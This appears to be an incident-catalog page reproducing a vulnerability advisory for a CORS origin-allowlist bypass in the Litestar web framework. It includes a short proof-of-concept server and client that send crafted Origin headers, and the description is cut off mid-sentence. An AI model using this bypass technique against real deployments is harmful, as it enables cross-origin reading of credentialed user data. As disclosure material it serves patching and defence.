---
title: "INC-09436 — Litestar's CORS origin allowlist has a bypass due to unescaped regex metacharacters in allowed origins"
layout: incident
permalink: /incident/INC-09436.html
incident_id: INC-09436
year: 2026
severity: High
description_preview: "### Summary CORS origin validation can be bypassed because the allowed-origins allowlist is compiled into a regex without escaping metacharacters (notably .). An allowed origin like https://good.examp"
tags_str: "cve, ghsa, litestar"
---

{% raw %}
<div class="incident-anchor" id="inc-09436" markdown="1">

### INC-09436  [↗](/incident/INC-09436.html)

**Litestar's CORS origin allowlist has a bypass due to unescaped regex metacharacters in allowed origins**  
_2026-02 · vulnerability-disclosure · Severity: High_

CVEs: `CVE-2026-25478`
CWEs: `CWE-942`
CVSS: **7.4** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`

### Summary CORS origin validation can be bypassed because the allowed-origins allowlist is compiled into a regex without escaping metacharacters (notably .). An allowed origin like https://good.example can match https://goodXexample, resulting in Access-Control-Allow-Origin being set for an untrusted origin ### Details CORSConfig.allowed_origins_regex is constructed using a regex built from configured allowlist values and used with fullmatch() for validation. Because metacharacters are not escaped, a malicious origin can match unexpectedly. The check relies on allowed_origins_regex.fullmatch(origin). ### PoC Server (poc_cors_server.py) ``` from litestar import Litestar, get from litestar.config.cors import CORSConfig @get("/c") async def c() -> str: return "ok" cors = CORSConfig( allow_origins=["https://good.example"], allow_credentials=True, ) app = Litestar([c], cors_config=cors) ``` `uvicorn poc_cors_server:app --host 127.0.0.1 --port 8002` Client (poc_cors_client.py) ``` import http.client def req(origin: str) -> tuple[int, str | None]: c = http.client.HTTPConnection("127.0.0.1", 8002, timeout=3) c.request("GET", "/c", headers={"Origin": origin, "Host": "example.com"}) r = c.getresponse() r.read() acao = r.getheader("Access-Control-Allow-Origin") c.close() return r.status, acao print("evil:", req("https://evil.example")) print("bypass:", req("https://goodXexample")) ``` Expected (vulnerable behavior): Origin: https://e

**Affected:** pip/litestar  
**Attack vector:** `other`  

**OWASP LLM Top 10:** `LLM03`  
**OWASP Agentic (ASI):** `ASI03`, `ASI04`  
**NIST AI RMF:** `GOVERN-1.4`, `GOVERN-6.1`  
**MITRE ATLAS:** `AML.T0010`, `AML.T0012`  

**References:**
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-25478) _(advisory)_
- [GHSA-2p2x-hpg8-cqp2](https://github.com/advisories/GHSA-2p2x-hpg8-cqp2) _(advisory)_
- [https://github.com/litestar-org/litestar/security/advisories/GHSA-2p2x-hpg8-cqp2](https://github.com/litestar-org/litestar/security/advisories/GHSA-2p2x-hpg8-cqp2) _(reference)_
- [https://github.com/litestar-org/litestar/commit/eb87703b309efcc0d1b087dcb12784e76b003d5a](https://github.com/litestar-org/litestar/commit/eb87703b309efcc0d1b087dcb12784e76b003d5a) _(reference)_
- [https://docs.litestar.dev/2/release-notes/changelog.html#2.20.0](https://docs.litestar.dev/2/release-notes/changelog.html#2.20.0) _(reference)_
- [https://github.com/litestar-org/litestar/releases/tag/v2.20.0](https://github.com/litestar-org/litestar/releases/tag/v2.20.0) _(reference)_

**Tags:** `cve`, `ghsa`, `litestar`

</div>

{% endraw %}
